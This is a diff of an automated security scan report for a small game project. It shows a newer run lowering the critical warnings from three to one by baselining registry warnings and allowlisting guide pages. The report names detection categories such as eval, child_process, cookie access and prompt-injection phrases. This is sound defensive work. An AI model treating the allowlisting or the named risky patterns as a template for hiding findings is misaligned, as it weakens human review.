@@ -1,39 +1,34 @@
 # Security scan report
 
-Generated 2026-11-24T12:57:50-05:00 for `/home/projects/beta_games`.
+Generated 2026-11-24T13:23:34-05:00 for `/home/projects/beta_games`.
 
 ## Verdict: MEDIUM RISK
 
-> no FAIL, but 3 WARN in supply-chain/secrets/config checks ([13] [11] [18]). Rule: a WARN in a critical-class check needs a human decision before installing.
+> no FAIL, but 1 WARN in supply-chain/secrets/config checks ([13]). Rule: a WARN in a critical-class check needs a human decision before installing.
 >
 > A LOW verdict means **no indicators found by these checks**, never "safe"; see "Residual risk" below. MEDIUM means a human must read the critical-class WARN items and decide; HIGH means stop.
 
-Checks: 26 pass, 5 warn (3 critical-class, 2 hygiene), 0 fail, 7 info, 0 skipped.
+Checks: 26 pass, 2 warn (1 critical-class, 1 hygiene), 0 fail, 7 info, 0 skipped.
 
 ## What was scanned
 
-- 308 files in the working tree (tracked + untracked, not ignored); 301 text files read for patterns
 - project-bolt-stackblitz-starters-kppnjtxg/project/package-lock.json: lockfileVersion 3, 289 package entries
 - installed node_modules next to project-bolt-stackblitz-starters-kppnjtxg/project/package-lock.json: 187 packages (missing 47, version-differs 3, extra 15, unknown-on-disk 0)
 - registry metadata: 289 name@version pairs (0 fetched, 289 cached, 0 errors); provenance on 166
 - node_modules static scan (installed): 187 package dirs, 17461 files, 118.5 MB read
 - code scan (repo): 295 files
 - code scan (stackblitz-starters-gg5payac-11-24.zip): 264 files
-- code scan (stackblitz-starters-11-22-26.zip): 263 files
-- code scan (stackblitz-starters-old.zip): 262 files
-- archives: 3 zip(s), 954 entries listed, 3 extracted to scratch for static inspection
-- git history: 13 commits, 3.2 MB of patches scanned
+- archives: 1 zip(s), 319 entries listed, 1 extracted to scratch for static inspection
+- git history: 14 commits, 3.7 MB of patches scanned
 
 ## Results
 
 | ID | Check | Class | Status | Summary |
 |---|---|---|---|---|
 | | **Files and secrets** | | | |
-| 1 | Sensitive files (.env, keys, credentials, databases) | critical | **PASS** | none among 308 files |
-| 2 | Hard-coded secrets and personal data | critical | **PASS** | no secret-looking strings in 300 text files; 0 e-mail address(es) listed for review |
-| 21 | Binaries, executables and symlinks in the tree | critical | **PASS** | no native binaries or symlinks; 5 script/executable/large file(s) listed |
-| 22 | Zip archives (listing, traversal, symlinks, sensitive entries, diff vs tree) | critical | **PASS** | 3 archive(s), 954 entries, 3 extracted to scratch for static inspection |
-| 23 | Secrets in git history | critical | **PASS** | no credential-shaped strings added in the last 400 commits (13 total, 3274 KB of patches; our own security-scan.sh and scan/selftest.sh are left out because they hold the fake test keys and the key patterns) |
+| 1 | Sensitive files (.env, keys, credentials, databases) | critical | **PASS** | none among 307 files |
+| 22 | Zip archives (listing, traversal, symlinks, sensitive entries, diff vs tree) | critical | **PASS** | 1 archive(s), 319 entries, 1 extracted to scratch for static inspection |
+| 23 | Secrets in git history | critical | **PASS** | no credential-shaped strings added in the last 400 commits (14 total, 3745 KB of patches; our own security-scan.sh and scan/selftest.sh are left out because they hold the fake test keys and the key patterns) |
 | 24 | Sensitive files ever committed (added or deleted) | critical | **PASS** | none; 1 file(s) were deleted over the history (listed) |
 | 25 | Large objects in git history (>1 MB) | hygiene | **info** | 2 blob(s); large binaries in history cannot be reviewed by reading and stay downloadable forever |
 | | **Dependencies (supply chain)** | | | |
@@ -42,7 +37,7 @@ Checks: 26 pass, 5 warn (3 critical-class, 2 hygiene), 0 fail, 7 info, 0 skipped
 | 5 | Dependency specs (pinning and source) | critical | **PASS** | all installable specs are registry versions/ranges |
 | 6 | package.json matches its lockfile | critical | **PASS** | root specs identical in package.json and package-lock.json |
 | 10 | Lookalike (typosquat) package names | critical | **PASS** | no lookalikes of 181 well-known names among 287 package names |
-| 11 | Registry metadata (release age, maintainers, deprecation) | critical | **WARN** | 48 too-new (<14d), 2 dormant-then-updated, 0 brand-new, 0 non-maintainer publishes, 1 deprecated, 0 lookup failures |
+| 11 | Registry metadata (release age, maintainers, deprecation) | critical | **PASS** | 289/289 versions checked: no new or changed version younger than 14 days or deprecated, no maintainer anomalies (49 note(s) on versions already accepted in the last commit are in the evidence) |
 | 12 | What the dependency update changed (vs last commit) | critical | **info** | lockfile identical to the last commit |
 | 13 | Installed node_modules vs lockfile | critical | **WARN** | installed tree is stale / does not match the lockfile: @rolldown/pluginutils installed 1.1.1 vs lockfile 1.0.0-beta.27; @vitejs/plugin-react installed 6.3.0 vs lockfile 4.7.0; vite installed 8.3.8 vs lockfile 6.4.6 |
 | 9 | npm audit (known vulnerabilities) | critical | **PASS** | project-bolt-stackblitz-starters-kppnjtxg/project: critical=0 high=0 moderate=2 low=0 (of 289 packages); 2 accepted via allowlist |
@@ -57,61 +52,40 @@ Checks: 26 pass, 5 warn (3 critical-class, 2 hygiene), 0 fail, 7 info, 0 skipped
 | | **Code** | | | |
 | 7a | Code patterns: malicious indicators (FAIL-level) | critical | **PASS** | no known-bad patterns in 295 files |
 | 7b | Code patterns: needs a human look (WARN-level) | critical | **PASS** | no eval, Function constructor, child_process, dynamic innerHTML, cookie access or secret-looking storage outside the allowlist |
-| 7c | Code patterns: network and DOM inventory (INFO) | hygiene | **info** | 17 line(s): EXTERNAL_STYLE_NO_SRI=14, INNERHTML_CONST=2, NET_CALL=4 |
-| 7d | Code patterns: allowlisted hits (accepted, listed for transparency) | hygiene | **info** | 61 hit(s) in allowlisted paths (vendored shadcn/ui components, scanner sources) |
+| 7c | Code patterns: network and DOM inventory (INFO) | hygiene | **info** | 8 line(s): EXTERNAL_STYLE_NO_SRI=14, INNERHTML_CONST=2, NET_CALL=4 |
+| 7d | Code patterns: allowlisted hits (accepted, listed for transparency) | hygiene | **info** | 85 hit(s) in allowlisted paths (vendored shadcn/ui components, scanner sources) |
 | 8 | External hosts referenced by code/markup/css | critical | **PASS** | only allowlisted hosts (5) |
 | 16 | Vite server settings, dev-server exposure, CORS and tunnel host | hygiene | **WARN** | 0 unsafe vite setting(s), 10 exposure setting(s) (--host / host 0.0.0.0 / open CORS); signal.gamelab.link MISSING from allowedHosts (site regression) |
-| 26a | Code in stackblitz-starters-old.zip: malicious indicators (FAIL-level) | critical | **PASS** | no known-bad patterns in 262 files |
+| 26a | Code in stackblitz-starters-gg5payac-11-24.zip: malicious indicators (FAIL-level) | critical | **PASS** | no known-bad patterns in 264 files |
 | | **Configuration and AI-agent surface** | | | |
 | 17 | .npmrc content | critical | **PASS** | 1 file(s), only harmless keys |
-| 18 | Automation hooks (Replit, git hooks, CI, scripts) | critical | **WARN** | 1 automation entry point(s) to know about |
+| 18 | Automation hooks (Replit, git hooks, CI, scripts) | critical | **PASS** | no automation that would run code on this host |
 | 19 | AI-agent settings (.claude/.agents/.mm3/.mcp) | critical | **PASS** | 2 settings file(s); no hooks, no broad pre-approved permissions, no MCP servers |
-| 20 | Prompt-injection style text in docs, memory and config | critical | **PASS** | no injection-style phrases in 42 text/config files |
+| 20 | Prompt-injection style text in docs, memory and config | critical | **PASS** | no injection-style phrases in 43 text/config files |
 | | **Other** | | | |
 | 27 | npm install-scripts ls | critical | **info** | not available in npm 11.10.1 (added in a newer npm); install scripts are still blocked by --ignore-scripts in scan/contained-install.sh |
-| 7e | Code patterns: HTML injection sinks with variable input | hygiene | **WARN** | 14 innerHTML/dangerouslySetInnerHTML assignment(s) built from variables (fine if the variables are the page's own constants; a bug if they ever hold player input) |
+| 7e | Code patterns: HTML injection sinks with variable input | hygiene | **PASS** | no innerHTML/dangerouslySetInnerHTML with variable input outside the allowlist |
+| 26b | Code in stackblitz-starters-gg5payac-11-24.zip: needs a human look (WARN-level) | critical | **PASS** | no eval, Function constructor, child_process, cookie access or secret storage in the zip outside the allowlist |
 
 ## Evidence per check
 
 ### [1] Sensitive files (.env, keys, credentials, databases) — PASS
 
-none among 308 files
+none among 307 files
 
 ```
 info project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc (npm config, content checked in [17])
 ```
 
-### [2] Hard-coded secrets and personal data — PASS
-
-no secret-looking strings in 300 text files; 0 e-mail address(es) listed for review
-
-### [21] Binaries, executables and symlinks in the tree — PASS
-
-no native binaries or symlinks; 5 script/executable/large file(s) listed
-
-```
-info scan/update-check.sh: script file, executable (5045 bytes)
-info project-bolt-stackblitz-starters-kppnjtxg/project/scripts/post-merge.sh: script file (72 bytes)
-info scan/contained-install.sh: script file, executable (10084 bytes)
-info scan/selftest.sh: script file, executable (7592 bytes)
-info security-scan.sh: script file, executable (21146 bytes)
-```
-
 ### [22] Zip archives (listing, traversal, symlinks, sensitive entries, diff vs tree) — PASS
 
-3 archive(s), 954 entries, 3 extracted to scratch for static inspection
+1 archive(s), 319 entries, 1 extracted to scratch for static inspection
 
 ```
 info stackblitz-starters-gg5payac-11-24.zip: 1357 KB, 319 entries
 info stackblitz-starters-gg5payac-11-24.zip contains project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc (content checked after extraction / in [17] if same as repo)
 info stackblitz-starters-gg5payac-11-24.zip executable/binary entry: project-bolt-stackblitz-starters-kppnjtxg/project/scripts/post-merge.sh
-info stackblitz-starters-11-22-26.zip: 1307 KB, 318 entries
-info stackblitz-starters-11-22-26.zip contains project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc (content checked after extraction / in [17] if same as repo)
-info stackblitz-starters-11-22-26.zip executable/binary entry: project-bolt-stackblitz-starters-kppnjtxg/project/scripts/post-merge.sh
-info stackblitz-starters-old.zip: 1104 KB, 317 entries
-info stackblitz-starters-old.zip contains project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc (content checked after extraction / in [17] if same as repo)
-info stackblitz-starters-old.zip executable/binary entry: project-bolt-stackblitz-starters-kppnjtxg/project/scripts/post-merge.sh
-info zip vs working tree: 33 differing path(s) listed below (ONLY-IN-ZIP / ONLY-IN-REPO / DIFFERS)
+info zip vs working tree: 7 differing path(s) listed below (ONLY-IN-ZIP / ONLY-IN-REPO / DIFFERS)
 stackblitz-starters-gg5payac-11-24.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .claude
 stackblitz-starters-gg5payac-11-24.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .mm3
 stackblitz-starters-gg5payac-11-24.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc
@@ -119,37 +93,11 @@ stackblitz-starters-gg5payac-11-24.zip: ONLY-IN-REPO project-bolt-stackblitz-sta
 stackblitz-starters-gg5payac-11-24.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: GAME_SPEEDUP.md
 stackblitz-starters-gg5payac-11-24.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: UPDATE-INSTRUCTION.md
 stackblitz-starters-gg5payac-11-24.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: docs
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .claude
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .mm3
-stackblitz-starters-11-22-26.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .npmrc.txt
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: GAME_SPEEDUP.md
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: UPDATE-INSTRUCTION.md
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: docs
-stackblitz-starters-11-22-26.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/App.tsx
-stackblitz-starters-11-22-26.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/components/BuriedComplexGame.tsx
-stackblitz-starters-11-22-26.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project/src/lib: Pixel-skins.ts
-stackblitz-starters-11-22-26.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/lib/deep-signal-engine.ts
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .claude
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .mm3
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/.npmrc
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: .npmrc.txt
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: GAME_SPEEDUP.md
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: UPDATE-INSTRUCTION.md
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project: docs
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/package-lock.json
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/package.json
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/App.tsx
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/components/BuriedComplexGame.tsx
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project/src/lib: Pixel-skins.ts
-stackblitz-starters-old.zip: ONLY-IN-REPO project-bolt-stackblitz-starters-kppnjtxg/project/src/lib: deep-signal-audio.ts
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/lib/deep-signal-engine.ts
-stackblitz-starters-old.zip: DIFFERS      project-bolt-stackblitz-starters-kppnjtxg/project/src/lib/deep-signal-store.ts
 ```
 
 ### [23] Secrets in git history — PASS
 
-no credential-shaped strings added in the last 400 commits (13 total, 3274 KB of patches; our own security-scan.sh and scan/selftest.sh are left out because they hold the fake test keys and the key patterns)
+no credential-shaped strings added in the last 400 commits (14 total, 3745 KB of patches; our own security-scan.sh and scan/selftest.sh are left out because they hold the fake test keys and the key patterns)
 
 ### [24] Sensitive files ever committed (added or deleted) — PASS
 
@@ -250,62 +198,12 @@ project-bolt-stackblitz-starters-kppnjtxg/project: in sync (1 deps, 47 devDeps)
 
 no lookalikes of 181 well-known names among 287 package names
 
-### [11] Registry metadata (release age, maintainers, deprecation) — WARN
+### [11] Registry metadata (release age, maintainers, deprecation) — PASS
 
-48 too-new (<14d), 2 dormant-then-updated, 0 brand-new, 0 non-maintainer publishes, 1 deprecated, 0 lookup failures
+289/289 versions checked: no new or changed version younger than 14 days or deprecated, no maintainer anomalies (49 note(s) on versions already accepted in the last commit are in the evidence)
 
 ```
-WARN too-new: @babel/generator@7.29.14: published 12.9 days ago (2026-11-11), previous 7.29.13 7 days earlier
-WARN too-new: @babel/helper-module-transforms@7.29.14: published 12.9 days ago (2026-11-11), previous 8.1.2 0 days earlier
-WARN too-new: @babel/helper-string-parser@7.29.14: published 12.9 days ago (2026-11-11), previous 7.29.13 7 days earlier
-WARN too-new: @babel/helpers@7.29.14: published 12.9 days ago (2026-11-11), previous 8.1.2 0 days earlier
-WARN too-new: @babel/parser@7.29.14: published 12.9 days ago (2026-11-11), previous 7.29.13 7 days earlier
-WARN too-new: @babel/runtime@7.29.14: published 12.9 days ago (2026-11-11), previous 7.29.13 7 days earlier
-WARN too-new: @babel/traverse@7.29.14: published 12.9 days ago (2026-11-11), previous 8.1.2 0 days earlier
-WARN too-new: @babel/types@7.29.14: published 12.9 days ago (2026-11-11), previous 8.1.0 9 days earlier
-WARN too-new: @jridgewell/resolve-uri@3.1.3: published 11.6 days ago (2026-11-13), previous 3.1.2 1002 days earlier
-WARN too-new: @rollup/rollup-android-arm-eabi@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-android-arm64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-android-x64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-darwin-arm64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-darwin-x64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-freebsd-arm64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-freebsd-x64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-arm-gnueabihf@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-arm-musleabihf@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-arm64-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-arm64-musl@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-loong64-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-loong64-musl@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-ppc64-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-ppc64-musl@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-riscv64-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-riscv64-musl@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-s390x-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-x64-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-linux-x64-musl@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-openbsd-x64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-openharmony-arm64@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-win32-arm64-msvc@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-win32-ia32-msvc@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-win32-x64-gnu@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: @rollup/rollup-win32-x64-msvc@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: baseline-browser-mapping@2.11.38: published 7.8 days ago (2026-11-16), previous 2.11.37 4 days earlier
-WARN too-new: browserslist@4.29.6: published 8.0 days ago (2026-11-16), previous 4.29.5 21 days earlier
-WARN too-new: caniuse-lite@1.0.30001826: published 13.5 days ago (2026-11-11), previous 1.0.30001823 5 days earlier
-WARN too-new: electron-to-chromium@1.5.487: published 7.6 days ago (2026-11-17), previous 1.5.486 2 days earlier
-WARN too-new: enhanced-resolve@5.27.0: published 12.1 days ago (2026-11-12), previous 5.26.2 0 days earlier
-WARN too-new: graceful-fs@4.2.12: published 12.2 days ago (2026-11-12), previous 4.2.11 1337 days earlier
-WARN too-new: lucide-react@1.73.0: published 10.5 days ago (2026-11-14), previous 1.72.0 3 days earlier
-WARN too-new: node-releases@2.0.64: published 11.3 days ago (2026-11-13), previous 2.0.63 13 days earlier
-WARN too-new: postcss@8.5.33: published 10.8 days ago (2026-11-13), previous 8.5.32 18 days earlier
-WARN too-new: react-hook-form@7.92.0: published 13.3 days ago (2026-11-11), previous 8.0.0-beta.5 19 days earlier
-WARN too-new: rollup@4.68.4: published 8.4 days ago (2026-11-16), previous 4.68.3 3 days earlier
-WARN too-new: tapable@2.3.4: published 11.1 days ago (2026-11-13), previous 2.3.3 206 days earlier
-WARN too-new: update-browserslist-db@1.4.0: published 8.0 days ago (2026-11-16), previous 1.3.4 40 days earlier
-WARN dormant-then-updated: @jridgewell/resolve-uri@3.1.3: first release in 1002 days (dormant package suddenly updated)
-WARN dormant-then-updated: graceful-fs@4.2.12: first release in 1337 days (dormant package suddenly updated)
-WARN deprecated: recharts@2.15.4: 1.x and 2.x branches are no longer active. Bump to Recharts v3 to receive latest features and bugfixes. See https://git…
+INFO already in the last accepted lockfile, so not warned (49): @babel/generator@7.29.14: published 12.9 days ago; @babel/helper-module-transforms@7.29.14: published 12.9 days ago; @babel/helper-string-parser@7.29.14: published 12.9 days ago; @babel/helpers@7.29.14: published 12.9 days ago; @babel/parser@7.29.14: published 12.9 days ago; @babel/runtime@7.29.14: published 12.9 days ago; @babel/traverse@7.29.14: published 12.9 days ago; @babel/types@7.29.14: published 12.9 days ago; @jridgewell/resolve-uri@3.1.3: published 11.6 days ago; @rollup/rollup-android-arm-eabi@4.68.4: published 8.4 days ago; @rollup/rollup-android-arm64@4.68.4: published 8.4 days ago; @rollup/rollup-android-x64@4.68.4: published 8.4 days ago; …
 INFO published from CI via trusted publishing with provenance (162): @babel/code-frame@7.29.7, @babel/compat-data@7.29.7, @babel/core@7.29.13, @babel/generator@7.29.14, @babel/helper-compilation-targets@7.29.13, @babel/helper-globals@7.29.7, @babel/helper-module-imports@7.29.7, @babel/helper-module-transforms@7.29.14, @babel/helper-plugin-utils@7.29.7, @babel/helper-string-parser@7.29.14, @babel/helper-validator-identifier@7.29.7, @babel/helper-validator-option@7.29.7, …
 INFO no repository field (1): @tabby_ai/hijri-converter@1.0.5
 INFO provenance attestations: 166/289 versions; registry signatures: 289/289
@@ -554,7 +452,7 @@ no eval, Function constructor, child_process, dynamic innerHTML, cookie access o
 
 ### [7c] Code patterns: network and DOM inventory (INFO) — INFO
 
-17 line(s): EXTERNAL_STYLE_NO_SRI=14, INNERHTML_CONST=2, NET_CALL=4
+8 line(s): EXTERNAL_STYLE_NO_SRI=14, INNERHTML_CONST=2, NET_CALL=4
 
 ```
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/global-arcade/index.html:16 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -562,15 +460,6 @@ project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/global-arcade/index.
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sandbox/index.html:21 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sandbox/index.html:22 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sandbox/index.html:25 [EXTERNAL_STYLE_NO_SRI] <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Architects+Daughter&family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1…
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/field-manual.html:8 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/field-manual.html:9 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/field-manual.html:10 [EXTERNAL_STYLE_NO_SRI] <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700&display=swap">
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:8 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:9 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:10 [EXTERNAL_STYLE_NO_SRI] <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700&display=swap">
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1511 [INNERHTML_CONST] if (m === 'real') $('#beat-say').innerHTML = 'Real speed: all three phases blur together, about <b>60 times every second</b>.';
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:1583 [INNERHTML_CONST] var f = +$('#floor').value, svg = $('#roomsvg'); svg.innerHTML = '';
-project-bolt-stackblitz-starters-kppnjtxg/project/docs/index.html:7 [EXTERNAL_STYLE_NO_SRI] <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@500;700&display=swap">
 project-bolt-stackblitz-starters-kppnjtxg/project/index.html:16 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">
 project-bolt-stackblitz-starters-kppnjtxg/project/index.html:17 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 project-bolt-stackblitz-starters-kppnjtxg/project/lib/api-client-react/src/custom-fetch.ts:363 [NET_CALL] const response = await fetch(input, { ...init, method, headers });
@@ -578,17 +467,41 @@ project-bolt-stackblitz-starters-kppnjtxg/project/lib/api-client-react/src/custo
 
 ### [7d] Code patterns: allowlisted hits (accepted, listed for transparency) — INFO
 
-61 hit(s) in allowlisted paths (vendored shadcn/ui components, scanner sources)
+85 hit(s) in allowlisted paths (vendored shadcn/ui components, scanner sources)
 
 ```
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/global-arcade/src/components/ui/chart.tsx:78 [DANGEROUS_HTML_DYNAMIC] dangerouslySetInnerHTML={{ __html: Object.entries(THEMES) .map( ([theme, prefix]) => `  (allowlisted: shadcn/ui generated components, vendored three times (chart.tsx injects a constant-shaped <style> string via dangerouslySetInnerHTML))
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/global-arcade/src/components/ui/sidebar.tsx:85 [DOCUMENT_COOKIE] document.cookie = `${SIDEBAR_COOKIE_NAME}=${openState}; path=/; max-age=${SIDEBAR_COOKIE_MAX_AGE}`;  (allowlisted: shadcn/ui generated components, vendored three times (chart.tsx injects a constant-shaped <style> string via dangerouslySetInnerHTML))
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sandbox/src/components/ui/chart.tsx:78 [DANGEROUS_HTML_DYNAMIC] dangerouslySetInnerHTML={{ __html: Object.entries(THEMES) .map( ([theme, prefix]) => `  (allowlisted: shadcn/ui generated components, vendored three times (chart.tsx injects a constant-shaped <style> string via dangerouslySetInnerHTML))
 project-bolt-stackblitz-starters-kppnjtxg/project/artifacts/mockup-sandbox/src/components/ui/sidebar.tsx:83 [DOCUMENT_COOKIE] document.cookie = `${SIDEBAR_COOKIE_NAME}=${openState}; path=/; max-age=${SIDEBAR_COOKIE_MAX_AGE}`  (allowlisted: shadcn/ui generated components, vendored three times (chart.tsx injects a constant-shaped <style> string via dangerouslySetInnerHTML))
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/field-manual.html:8 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/field-manual.html:9 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/field-manual.html:10 [EXTERNAL_STYLE_NO_SRI] <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700&display=swap">  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:8 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.googleapis.com">  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:9 [EXTERNAL_STYLE_NO_SRI] <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
+project-bolt-stackblitz-starters-kppnjtxg/project/docs/hacker-journey.html:10 [EXTERNAL_STYLE_NO_SRI] <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Space+Grotesk:wght@400;500;600;700&display=swap">  (allowlisted: our guide pages (written by Corey, not the son); innerHTML is fed constants only)
